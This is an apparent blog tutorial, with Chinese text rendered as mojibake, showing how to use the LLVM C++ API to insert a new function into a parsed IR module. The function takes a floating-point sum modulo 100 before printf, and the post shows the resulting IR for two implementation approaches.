#include \"llvm/Support/TargetSelect.h\" #include \"llvm/Support/SourceMgr.h\" #include &lt;llvm/Support/raw_os_ostream.h> #include \"llvm/Bitcode/BitcodeWriter.h\" #include &lt;iostream> #include &lt;string> #include &lt;fstream> #include &lt;cstdio> using namespace llvm; int main(int argc,char **argv)&#123; LLVMContext context; IRBuilder&lt;> builder(context); std::unique_ptr&lt;Module> M; std::unique_ptr&lt;MIRParser> MIR; SMDiagnostic Err; /** * #include \"llvm/IRReader/IRReader.h\" * 2022-04-26 03:04:32 * TODO: * from IR file get Moudle class * */ M = parseIRFile(StringRef(argv[1]),Err,context); if(M)&#123; std::cout&lt;&lt;\"debug: M is not null\"&lt;&lt;std::endl; // M->print(llvm::outs(),nullptr); &#125; else&#123; std::cout&lt;&lt;\"M is null\"&lt;&lt;std::endl; Err.print(argv[0],errs()); &#125; /** * 2022-04-26 03:25:52 * TODO: * è·å–mainå‡½æ•° * */ auto main_fn = M->getFunction(StringRef(\"main\")); /** * 2022-04-28 02:14:46 * TODO: * æ‰¾åˆ°faddæŒ‡ä»¤,ä¸faddçš„åä¸€ä¸ªæŒ‡ä»¤ * */ Instruction *in_fadd,*in_prt; for (inst_iterator I = inst_begin(*main_fn), E = inst_end(*main_fn); I != E; ++I)&#123; if(I->isBinaryOp() &amp;&amp; I->getOpcode()==Instruction::FAdd)&#123; // outs() &lt;&lt; *I &lt;&lt; \"\\n\"; in_fadd = &amp;*I; in_prt = &amp;*(I.operator++()); &#125; &#125; /** * 2022-04-28 02:42:32 * TODO: * %20 = load double, double* %5, align 8 * %21 = fadd double %19, %20 * 1. åˆ›å»ºå…¨å±€å˜é‡fadd_res * 2. å­˜å…¥å¸¸é‡100 * 3. å°†ADDç»“æœå­˜å…¥å†…å­˜ä¸­ * */ auto f32 = builder.getDoubleTy(); auto const_100 = ConstantFP::get(f32,double(100)); // åˆ›å»ºåˆå§‹å€¼0 auto const_0 = ConstantFP::get(f32,double(0)); auto in_alloc02 = new GlobalVariable(*M,f32,false,GlobalValue::PrivateLinkage,const_0,\"fadd_res\"); // è®¾ç½®å¯¹é½æ–¹å¼ in_alloc02->setAlignment(MaybeAlign(8)); // æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå°†FADDç»“æœ,å­˜åˆ°fadd_resä¸­ builder.SetInsertPoint(in_prt); auto in_alloc01 = builder.CreateAlloca(f32,0,\"ina1\"); auto in_store01 = builder.CreateStore(const_100,in_alloc01); auto in_store02 = builder.CreateStore(in_fadd,in_alloc02); /** * 2022-05-03 16:33:58 * TODO: * æ–°å»ºä¸€ä¸ªå‡½æ•°: * void work03_fn()&#123; * if(fdd_res > 100) * fdd_res = fdd_res %100; * &#125; * */ // åˆ›å»ºå‡½æ•° auto fn_prototype = FunctionType::get(builder.getVoidTy(), true); auto work03_fn = Function::Create(fn_prototype,Function::ExternalLinkage,\"work03_fn\",M.get()); // åˆ›å»ºåŸºæœ¬å— auto work03_fn_defaut= BasicBlock::Create(context, \"work03_fn_defaut\", work03_fn); auto work03_fn_change = BasicBlock::Create(context, \"work03_fn_change\", work03_fn); auto work03_fn_nothing = BasicBlock::Create(context, \"work03_fn_nothing\", work03_fn); // é»˜è®¤åŸºæœ¬å— æŒ‡ä»¤æ“ä½œ builder.SetInsertPoint(work03_fn_defaut); auto work03_de_load_01 = builder.CreateLoad(f32,in_alloc02); auto work03_de_fcmp_01 = builder.CreateFCmpUGT(work03_de_load_01,const_100); auto work03_de_br_01 = builder.CreateCondBr(work03_de_fcmp_01,work03_fn_change,work03_fn_nothing); // å–ä½™ æŒ‡ä»¤æ“ä½œ builder.SetInsertPoint(work03_fn_change); auto work03_ch_load_01 = builder.CreateLoad(f32,in_alloc02); auto work03_ch_frem_01 = builder.CreateFRem(work03_ch_load_01,const_100); auto work03_ch_store_01 = builder.CreateStore(work03_ch_frem_01,in_alloc02); builder.CreateRetVoid(); // ç¬¬ä¸‰ä¸ªåŸºæœ¬å—ä»€ä¹ˆéƒ½ä¸åš builder.SetInsertPoint(work03_fn_nothing); builder.CreateRetVoid(); /** * 2022-05-03 18:27:56 * TODO: * åœ¨è°ƒç”¨prtinf å‡½æ•°ä¹‹å‰æ’å…¥è°ƒç”¨å‡½æ•°æŒ‡ä»¤ * ä»¥åŠè¯»å–fadd_res, ä¿®æ”¹printf ç¬¬ä¸‰ä¸ªå‚æ•° * */ builder.SetInsertPoint(in_prt); builder.CreateCall(work03_fn); auto in_load03 = builder.CreateLoad(f32,in_alloc02); in_prt->setOperand(3,in_load03); // M->print(outs(),nullptr); /** * #include \"llvm/IR/Verifier.h\" * 2022-05-02 11:43:34 * TODO: * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken. * */ if(!llvm::verifyModule(*M,&amp;errs()))&#123; outs()&lt;&lt;\"debug: Module verify is ok \\n\"; // M->print(outs(),nullptr); &#125; /** * #include \"llvm/Bitcode/BitcodeWriter.h\" * 2022-05-03 12:55:33 * TODO: * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */ std::error_code EC; llvm::raw_fd_ostream OS(\"aftermain.bc\", EC,llvm::sys::fs::OpenFlags()); llvm::WriteBitcodeToFile(*M,OS,true); OS.flush(); return 0; &#125; 2.8) æ•ˆæœ ä¿®æ”¹åIRå¦‚ä¸‹ï¼š ./main main.ll debug: M is not null debug: Module verify is ok ; ModuleID = 'main.ll' source_filename = \"t.c\" target datalayout = \"e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128\" target triple = \"x86_64-unknown-linux-gnu\" %struct._IO_FILE = type &#123; i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] &#125; %struct._IO_marker = type opaque %struct._IO_codecvt = type opaque %struct._IO_wide_data = type opaque @.str = private unnamed_addr constant [22 x i8] c\"plz input two numbers\\00\", align 1 @stdin = external dso_local global %struct._IO_FILE*, align 8 @.str.1 = private unnamed_addr constant [21 x i8] c\"%.2f + %.2f = %.2f \\0A\\00\", align 1 @fadd_res = private global double 0.000000e+00, align 8 ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @main() #0 &#123; %1 = alloca i32, align 4 %2 = alloca i64, align 8 %3 = alloca i8*, align 8 %4 = alloca double, align 8 %5 = alloca double, align 8 store i32 0, i32* %1, align 4 %6 = call i32 @puts(i8* noundef getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0)) store i64 100, i64* %2, align 8 %7 = load i64, i64* %2, align 8 %8 = call noalias i8* @malloc(i64 noundef %7) #4 store i8* %8, i8** %3, align 8 %9 = load %struct._IO_FILE*, %struct._IO_FILE** @stdin, align 8 %10 = call i64 @getline(i8** noundef %3, i64* noundef %2, %struct._IO_FILE* noundef %9) %11 = load i8*, i8** %3, align 8 %12 = call double @atof(i8* noundef %11) #5 store double %12, double* %4, align 8 %13 = load %struct._IO_FILE*, %struct._IO_FILE** @stdin, align 8 %14 = call i64 @getline(i8** noundef %3, i64* noundef %2, %struct._IO_FILE* noundef %13) %15 = load i8*, i8** %3, align 8 %16 = call double @atof(i8* noundef %15) #5 store double %16, double* %5, align 8 %17 = load double, double* %4, align 8 %18 = load double, double* %5, align 8 %19 = load double, double* %4, align 8 %20 = load double, double* %5, align 8 %21 = fadd double %19, %20 %ina1 = alloca double, align 8 store double 1.000000e+02, double* %ina1, align 8 store double %21, double* @fadd_res, align 8 call void (...) @work03_fn() %22 = load double, double* @fadd_res, align 8 %23 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), double noundef %17, double noundef %18, double noundef %22) %24 = load i8*, i8** %3, align 8 call void @free(i8* noundef %24) #4 ret i32 0 &#125; declare dso_local i32 @puts(i8* noundef) #1 ; Function Attrs: nounwind declare dso_local noalias i8* @malloc(i64 noundef) #2 declare dso_local i64 @getline(i8** noundef, i64* noundef, %struct._IO_FILE* noundef) #1 ; Function Attrs: nounwind readonly willreturn declare dso_local double @atof(i8* noundef) #3 declare dso_local i32 @printf(i8* noundef, ...) #1 ; Function Attrs: nounwind declare dso_local void @free(i8* noundef) #2 define void @work03_fn(...) &#123; work03_fn_defaut: %0 = load double, double* @fadd_res, align 8 %1 = fcmp ugt double %0, 1.000000e+02 br i1 %1, label %work03_fn_change, label %work03_fn_nothing work03_fn_change: ; preds = %work03_fn_defaut %2 = load double, double* @fadd_res, align 8 %3 = frem double %2, 1.000000e+02 store double %3, double* @fadd_res, align 8 ret void work03_fn_nothing: ; preds = %work03_fn_defaut ret void &#125; attributes #0 = &#123; noinline nounwind optnone uwtable \"frame-pointer\"=\"all\" \"min-legal-vector-width\"=\"0\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" &#125; attributes #1 = &#123; \"frame-pointer\"=\"all\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" &#125; attributes #2 = &#123; nounwind \"frame-pointer\"=\"all\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" &#125; attributes #3 = &#123; nounwind readonly willreturn \"frame-pointer\"=\"all\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" &#125; attributes #4 = &#123; nounwind &#125; attributes #5 = &#123; nounwind readonly willreturn &#125; !llvm.module.flags = !&#123;!0, !1, !2&#125; !llvm.ident = !&#123;!3&#125; !0 = !&#123;i32 1, !\"wchar_size\", i32 4&#125; !1 = !&#123;i32 7, !\"uwtable\", i32 1&#125; !2 = !&#123;i32 7, !\"frame-pointer\", i32 2&#125; !3 = !&#123;!\"clang version 14.0.0\"&#125; ä¸‰) æ€è·¯äºŒæ‰§è¡Œ 2.1) -2.2) åŒä¸Š æ·»åŠ ç›¸å…³å¿…è¦æŒ‡ä»¤ /** * 2022-04-28 02:42:32 * TODO: * 1. åˆ›å»ºå¸¸é‡100 * 2. æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå­˜å‚¨æœ€ç»ˆçš„ä¿®æ”¹faddç»“æœ * */ auto f32 = builder.getDoubleTy(); auto const_100 = ConstantFP::get(f32,double(100)); // æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå­˜å‚¨æœ€ç»ˆçš„ä¿®æ”¹faddç»“æœ builder.SetInsertPoint(in_prt); auto in_alloc02 = builder.CreateAlloca(f32,0,\"ia01\"); 2.3) æ„é€ å‡½æ•° /** * 2022-05-03 22:05:01 * TODO: * æ–°å»ºä¸€ä¸ªå‡½æ•°: * double work03_fn(double fdd_res)&#123; * if(fdd_res > 100) * return fdd_res = fdd_res %100; * &#125;else&#123; * return fdd_res; * &#125; * */ // åˆ›å»ºå‡½æ•°çš„å‚æ•° std::vector&lt;Type*>parms; parms.push_back(f32); ArrayRef&lt;Type*>fn_parm(parms); // åˆ›å»ºå‡½æ•° auto fn_prototype = FunctionType::get(builder.getDoubleTy(),fn_parm,true); auto work03_fn = Function::Create(fn_prototype,Function::ExternalLinkage,\"work03_fn\",M.get()); // åˆ›å»ºä¼ çš„å®å‚ std::vector&lt;Value*>args; args.push_back(in_fadd); ArrayRef&lt;Value*> argRef(args); // åˆ›å»ºåŸºæœ¬å— auto work03_fn_defaut= BasicBlock::Create(context, \"work03_fn_defaut\", work03_fn); auto work03_fn_change = BasicBlock::Create(context, \"work03_fn_change\", work03_fn); auto work03_fn_nothing = BasicBlock::Create(context, \"work03_fn_nothing\", work03_fn); // é»˜è®¤åŸºæœ¬å— æŒ‡ä»¤æ“ä½œ builder.SetInsertPoint(work03_fn_defaut); // æ‹¿åˆ°å‡½æ•°å‚æ•° auto work03_de_alloc_01 = builder.CreateAlloca(f32,0,\"ial02\"); Function::arg_iterator argsit = work03_fn->arg_begin(); auto work03_de_p1 = argsit; auto work03_de_store_01 = builder.CreateStore(work03_de_p1,work03_de_alloc_01); // æ¯”è¾ƒå¤§å° auto work03_de_load_01 = builder.CreateLoad(f32,work03_de_alloc_01); auto work03_de_fcmp_01 = builder.CreateFCmpUGT(work03_de_load_01,const_100); auto work03_de_br_01 = builder.CreateCondBr(work03_de_fcmp_01,work03_fn_change,work03_fn_nothing); // å–ä½™ æŒ‡ä»¤æ“ä½œ builder.SetInsertPoint(work03_fn_change); auto work03_ch_load_01 = builder.CreateLoad(f32,work03_de_alloc_01); auto work03_ch_frem_01 = builder.CreateFRem(work03_ch_load_01,const_100); auto work03_ch_store_01 = builder.CreateStore(work03_ch_frem_01,work03_de_alloc_01); auto work03_ch_load02 = builder.CreateLoad(f32,work03_de_alloc_01); builder.CreateRet(work03_ch_load02); // ç¬¬ä¸‰ä¸ªåŸºæœ¬å— ä¸åšä¿®æ”¹ï¼Œè¿”å›ä»å‚æ•°ç§æ‹¿åˆ°çš„å€¼ builder.SetInsertPoint(work03_fn_nothing); auto work03_no_load01 = builder.CreateLoad(f32,work03_de_alloc_01); builder.CreateRet(work03_no_load01); 2.4) ä¿®æ”¹printfå‡½æ•° /** * 2022-05-03 18:27:56 * TODO: * åœ¨è°ƒç”¨prtinf å‡½æ•°ä¹‹å‰æ’å…¥è°ƒç”¨å‡½æ•°æŒ‡ä»¤ * ä»¥åŠè¯»å–fadd_res, ä¿®æ”¹printf ç¬¬ä¸‰ä¸ªå‚æ•° * */ builder.SetInsertPoint(in_prt); auto in_call_01 = builder.CreateCall(work03_fn,argRef); auto in_store03 = builder.CreateStore(in_call_01,in_alloc02); auto in_load03 = builder.CreateLoad(f32,in_alloc02); in_prt->setOperand(3,in_load03); 2.5)-2.6) éªŒè¯ä¸å†™å…¥ /** * #include \"llvm/IR/Verifier.h\" * 2022-05-02 11:43:34 * TODO: * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken. * */ if(!llvm::verifyModule(*M,&amp;errs()))&#123; outs()&lt;&lt;\"debug: Module verify is ok \\n\"; M->print(outs(),nullptr); &#125; /** * #include \"llvm/Bitcode/BitcodeWriter.h\" * 2022-05-03 12:55:33 * TODO: * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */ std::error_code EC; llvm::raw_fd_ostream OS(\"aftermain2.bc\", EC,llvm::sys::fs::OpenFlags()); llvm::WriteBitcodeToFile(*M,OS,true); OS.flush(); 2.7) å…¨éƒ¨æºç  /** * 2022-05-03 16:16:19 * sizaif * Work3ï¼šæ’å…¥ä¸€ä¸ªå‡½æ•°å¹¶è°ƒç”¨ã€‚å‡½æ•°ç”¨äºæ£€æŸ¥åŠ æ³•ç»“æœï¼Œå¦‚æœå¤§äº 100ï¼Œåˆ™å–ä½™ 100ã€‚æ­¤å‡½æ•°ä¼šä¿®æ”¹åŠ æ³•ç»“æœã€‚(å‡½æ•°æ“ä½œ) * * clang++ $(llvm-config --cxxflags --ldflags --system-libs --libs) -o main2 main2.cpp * ./main2 main.ll * lli aftermain2.bc * */ #include \"llvm/Transforms/Utils/BasicBlockUtils.h\" #include &lt;llvm/IR/IRBuilder.h> #include \"llvm/IR/LLVMContext.h\" #include \"llvm/IR/Module.h\" #include \"llvm/IR/InstIterator.h\" #include \"llvm/IR/Instruction.h\" #include \"llvm/IR/Instructions.h\" #include \"llvm/IR/InstrTypes.h\" #include \"llvm/IR/Verifier.h\" #include \"llvm/IRReader/IRReader.h\" #include \"llvm/CodeGen/MIRParser/MIRParser.h\" #include \"llvm/Support/InitLLVM.h\" #include \"llvm/Support/Debug.h\" #include \"llvm/Support/TargetSelect.h\" #include \"llvm/Support/SourceMgr.h\" #include &lt;llvm/Support/raw_os_ostream.h> #include \"llvm/Bitcode/BitcodeWriter.h\" #include &lt;iostream> #include &lt;string> #include &lt;fstream> #include &lt;cstdio> using namespace llvm; int main(int argc,char **argv)&#123; LLVMContext context; IRBuilder&lt;> builder(context); std::unique_ptr&lt;Module> M; std::unique_ptr&lt;MIRParser> MIR; SMDiagnostic Err; /** * #include \"llvm/IRReader/IRReader.h\" * 2022-04-26 03:04:32 * TODO: * from IR file get Moudle class * */ M = parseIRFile(StringRef(argv[1]),Err,context); if(M)&#123; std::cout&lt;&lt;\"debug: M is not null\"&lt;&lt;std::endl; // M->print(llvm::outs(),nullptr); &#125; else&#123; std::cout&lt;&lt;\"M is null\"&lt;&lt;std::endl; Err.print(argv[0],errs()); &#125; /** * 2022-04-26 03:25:52 * TODO: * è·å–mainå‡½æ•° * */ auto main_fn = M->getFunction(StringRef(\"main\")); /** * 2022-04-28 02:14:46 * TODO: * æ‰¾åˆ°faddæŒ‡ä»¤,ä¸faddçš„åä¸€ä¸ªæŒ‡ä»¤ * */ Instruction *in_fadd,*in_prt; for (inst_iterator I = inst_begin(*main_fn), E = inst_end(*main_fn); I != E; ++I)&#123; if(I->isBinaryOp() &amp;&amp; I->getOpcode()==Instruction::FAdd)&#123; // outs() &lt;&lt; *I &lt;&lt; \"\\n\"; in_fadd = &amp;*I; in_prt = &amp;*(I.operator++()); &#125; &#125; /** * 2022-04-28 02:42:32 * TODO: * 1. åˆ›å»ºå¸¸é‡100 * 2. æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå­˜å‚¨æœ€ç»ˆçš„ä¿®æ”¹faddç»“æœ * */ auto f32 = builder.getDoubleTy(); auto const_100 = ConstantFP::get(f32,double(100)); // æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå­˜å‚¨æœ€ç»ˆçš„ä¿®æ”¹faddç»“æœ builder.SetInsertPoint(in_prt); auto in_alloc02 = builder.CreateAlloca(f32,0,\"ia01\"); /** * 2022-05-03 22:05:01 * TODO: * æ–°å»ºä¸€ä¸ªå‡½æ•°: * double work03_fn(double fdd_res)&#123; * if(fdd_res > 100) * return fdd_res = fdd_res %100; * &#125;else&#123; * return fdd_res; * &#125; * */ // åˆ›å»ºå‡½æ•°çš„å‚æ•° std::vector&lt;Type*>parms; parms.push_back(f32); ArrayRef&lt;Type*>fn_parm(parms); // åˆ›å»ºå‡½æ•° auto fn_prototype = FunctionType::get(builder.getDoubleTy(),fn_parm,true); auto work03_fn = Function::Create(fn_prototype,Function::ExternalLinkage,\"work03_fn\",M.get()); // åˆ›å»ºä¼ çš„å®å‚ std::vector&lt;Value*>args; args.push_back(in_fadd); ArrayRef&lt;Value*> argRef(args); // åˆ›å»ºåŸºæœ¬å— auto work03_fn_defaut= BasicBlock::Create(context, \"work03_fn_defaut\", work03_fn); auto work03_fn_change = BasicBlock::Create(context, \"work03_fn_change\", work03_fn); auto work03_fn_nothing = BasicBlock::Create(context, \"work03_fn_nothing\", work03_fn); // é»˜è®¤åŸºæœ¬å— æŒ‡ä»¤æ“ä½œ builder.SetInsertPoint(work03_fn_defaut); // æ‹¿åˆ°å‡½æ•°å‚æ•° auto work03_de_alloc_01 = builder.CreateAlloca(f32,0,\"ial02\"); Function::arg_iterator argsit = work03_fn->arg_begin(); auto work03_de_p1 = argsit; auto work03_de_store_01 = builder.CreateStore(work03_de_p1,work03_de_alloc_01); // æ¯”è¾ƒå¤§å° auto work03_de_load_01 = builder.CreateLoad(f32,work03_de_alloc_01); auto work03_de_fcmp_01 = builder.CreateFCmpUGT(work03_de_load_01,const_100); auto work03_de_br_01 = builder.CreateCondBr(work03_de_fcmp_01,work03_fn_change,work03_fn_nothing); // å–ä½™ æŒ‡ä»¤æ“ä½œ builder.SetInsertPoint(work03_fn_change); auto work03_ch_load_01 = builder.CreateLoad(f32,work03_de_alloc_01); auto work03_ch_frem_01 = builder.CreateFRem(work03_ch_load_01,const_100); auto work03_ch_store_01 = builder.CreateStore(work03_ch_frem_01,work03_de_alloc_01); auto work03_ch_load02 = builder.CreateLoad(f32,work03_de_alloc_01); builder.CreateRet(work03_ch_load02); // ç¬¬ä¸‰ä¸ªåŸºæœ¬å— ä¸åšä¿®æ”¹ï¼Œè¿”å›ä»å‚æ•°ç§æ‹¿åˆ°çš„å€¼ builder.SetInsertPoint(work03_fn_nothing); auto work03_no_load01 = builder.CreateLoad(f32,work03_de_alloc_01); builder.CreateRet(work03_no_load01); /** * 2022-05-03 18:27:56 * TODO: * åœ¨è°ƒç”¨prtinf å‡½æ•°ä¹‹å‰æ’å…¥è°ƒç”¨å‡½æ•°æŒ‡ä»¤ * ä»¥åŠè¯»å–fadd_res, ä¿®æ”¹printf ç¬¬ä¸‰ä¸ªå‚æ•° * */ builder.SetInsertPoint(in_prt); auto in_call_01 = builder.CreateCall(work03_fn,argRef); auto in_store03 = builder.CreateStore(in_call_01,in_alloc02); auto in_load03 = builder.CreateLoad(f32,in_alloc02); in_prt->setOperand(3,in_load03); // M->print(outs(),nullptr); /** * #include \"llvm/IR/Verifier.h\" * 2022-05-02 11:43:34 * TODO: * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken. * */ if(!llvm::verifyModule(*M,&amp;errs()))&#123; outs()&lt;&lt;\"debug: Module verify is ok \\n\"; M->print(outs(),nullptr); &#125; /** * #include \"llvm/Bitcode/BitcodeWriter.h\" * 2022-05-03 12:55:33 * TODO: * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */ std::error_code EC; llvm::raw_fd_ostream OS(\"aftermain2.bc\", EC,llvm::sys::fs::OpenFlags()); llvm::WriteBitcodeToFile(*M,OS,true); OS.flush(); return 0; &#125; 2.8) æ•ˆæœ ä¿®æ”¹åIRä»£ç å¦‚ä¸‹ï¼š ; ModuleID = 'main.ll' source_filename = \"t.c\" target datalayout = \"e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128\" target triple = \"x86_64-unknown-linux-gnu\" %struct._IO_FILE = type &#123; i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] &#125; %struct._IO_marker = type opaque %struct._IO_codecvt = type opaque %struct._IO_wide_data = type opaque @.str = private unnamed_addr constant [22 x i8] c\"plz input two numbers\\00\", align 1 @stdin = external dso_local global %struct._IO_FILE*, align 8 @.str.1 = private unnamed_addr constant [21 x i8] c\"%.2f + %.2f = %.2f \\0A\\00\", align 1 ; Function Attrs: noinline nounwind optnone uwtable define dso_local i32 @main() #0 &#123; %1 = alloca i32, align 4 %2 = alloca i64, align 8 %3 = alloca i8*, align 8 %4 = alloca double, align 8 %5 = alloca double, align 8 store i32 0, i32* %1, align 4 %6 = call i32 @puts(i8* noundef getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0)) store i64 100, i64* %2, align 8 %7 = load i64, i64* %2, align 8 %8 = call noalias i8* @malloc(i64 noundef %7) #4 store i8* %8, i8** %3, align 8 %9 = load %struct._IO_FILE*, %struct._IO_FILE** @stdin, align 8 %10 = call i64 @getline(i8** noundef %3, i64* noundef %2, %struct._IO_FILE* noundef %9) %11 = load i8*, i8** %3, align 8 %12 = call double @atof(i8* noundef %11) #5 store double %12, double* %4, align 8 %13 = load %struct._IO_FILE*, %struct._IO_FILE** @stdin, align 8 %14 = call i64 @getline(i8** noundef %3, i64* noundef %2, %struct._IO_FILE* noundef %13) %15 = load i8*, i8** %3, align 8 %16 = call double @atof(i8* noundef %15) #5 store double %16, double* %5, align 8 %17 = load double, double* %4, align 8 %18 = load double, double* %5, align 8 %19 = load double, double* %4, align 8 %20 = load double, double* %5, align 8 %21 = fadd double %19, %20 %ia01 = alloca double, align 8 %22 = call double (double, ...) @work03_fn(double %21) store double %22, double* %ia01, align 8 %23 = load double, double* %ia01, align 8 %24 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), double noundef %17, double noundef %18, double noundef %23) %25 = load i8*, i8** %3, align 8 call void @free(i8* noundef %25) #4 ret i32 0 &#125; declare dso_local i32 @puts(i8* noundef) #1 ; Function Attrs: nounwind declare dso_local noalias i8* @malloc(i64 noundef) #2 declare dso_local i64 @getline(i8** noundef, i64* noundef, %struct._IO_FILE* noundef) #1 ; Function Attrs: nounwind readonly willreturn declare dso_local double @atof(i8* noundef) #3 declare dso_local i32 @printf(i8* noundef, ...) #1 ; Function Attrs: nounwind declare dso_local void @free(i8* noundef) #2 define double @work03_fn(double %0, ...) &#123; work03_fn_defaut: %ial02 = alloca double, align 8 store double %0, double* %ial02, align 8 %1 = load double, double* %ial02, align 8 %2 = fcmp ugt double %1, 1.000000e+02 br i1 %2, label %work03_fn_change, label %work03_fn_nothing work03_fn_change: ; preds = %work03_fn_defaut %3 = load double, double* %ial02, align 8 %4 = frem double %3, 1.000000e+02 store double %4, double* %ial02, align 8 %5 = load double, double* %ial02, align 8 ret double %5 work03_fn_nothing: ; preds = %work03_fn_defaut %6 = load double, double* %ial02, align 8 ret double %6 &#125; attributes #0 = &#123; noinline nounwind optnone uwtable \"frame-pointer\"=\"all\" \"min-legal-vector-width\"=\"0\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" &#125; attributes #1 = &#123; \"frame-pointer\"=\"all\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" &#125; attributes #2 = &#123; nounwind \"frame-pointer\"=\"all\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" &#125; attributes #3 = &#123; nounwind readonly willreturn \"frame-pointer\"=\"all\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" &#125; attributes #4 = &#123; nounwind &#125; attributes #5 = &#123; nounwind readonly willreturn &#125; !llvm.module.flags = !&#123;!0, !1, !2&#125; !llvm.ident = !&#123;!3&#125; !0 = !&#123;i32 1, !\"wchar_size\", i32 4&#125; !1 = !&#123;i32 7, !\"uwtable\", i32 1&#125; !2 = !&#123;i32 7, !\"frame-pointer\", i32 2&#125; !3 = !&#123;!\"clang version 14.0.0\"&#125; å››) æ€»ç»“ æ¶‰åŠåˆ°åˆ›å»ºå…¨å±€å˜é‡æ“ä½œ, åˆ›å»ºæ—¶éœ€è¦åˆå§‹åŒ–å…¶å€¼ã€‚ ä¸€ç§æ—¶ç›´æ¥æ„é€ åˆ›å»ºï¼Œæˆ–ä½¿ç”¨Moduleç±»ä¸­getOrInsertGlobalæ–¹æ³•ã€‚ auto in_alloc02 = new GlobalVariable(*M,f32,false,GlobalValue::PrivateLinkage,const_0,\"fadd_res\"); GlobalVariable::GlobalVariable(Module &amp;M, Type *Ty, bool constant, LinkageTypes Link, Constant *InitVal, const Twine &amp;Name, GlobalVariable *Before, ThreadLocalMode TLMode, Optional&lt;unsigned> AddressSpace, bool isExternallyInitialized) // Overload to construct a global variable using its constructor's defaults. Constant *Module::getOrInsertGlobal(StringRef Name, Type *Ty) &#123; return getOrInsertGlobal(Name, Ty, [&amp;] &#123; return new GlobalVariable(*this, Ty, false, GlobalVariable::ExternalLinkage, nullptr, Name); &#125;); &#125; åˆ›å»ºå‡½æ•°æ“ä½œï¼Œ å…ˆæŒ‡å®šè¿”å›ç±»å‹ä¸å‡½æ•°çš„å‚æ•° æ„é€ å‡½æ•° åˆ›å»ºåŸºæœ¬å— éå†å‡½æ•°çš„å‚æ•°å¹¶è¯»å– åŸºæœ¬å—æ’å…¥æŒ‡ä»¤ æ·»åŠ è¿”å›æŒ‡ä»¤ï¼Œå³ä½¿å‡½æ•°ä¸ºvoidï¼Œä¹Ÿåº”æ·»åŠ ret voidæŒ‡ä»¤","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"LLVM","slug":"Master/LLVM","permalink":"https://www.sizaif.com/navigation/categories/Master/LLVM/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"LLVM","slug":"LLVM","permalink":"https://www.sizaif.com/tags/LLVM/"}],"author":"sizaif"},{"title":"LLVM 